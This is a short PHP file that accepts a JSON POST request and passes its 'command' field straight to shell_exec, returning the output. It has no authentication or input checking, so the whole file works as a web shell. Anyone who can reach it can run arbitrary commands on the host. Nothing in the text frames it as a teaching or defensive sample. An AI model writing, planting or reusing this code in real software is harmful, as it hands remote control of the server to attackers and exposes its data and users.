<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);

    if (isset($data['command'])) {
        $command = $data['command'];
        $output = shell_exec($command);

        $response = array('success' => true, 'output' => $output);
        echo json_encode($response);
    } else {
        $response = array('success' => true, 'output' => 'No command provided');
        echo json_encode($response);
    }
} else {
    http_response_code(405);
    $response = array('success' => false, 'message' => 'Only POST requests are allowed');
    echo json_encode($response);
}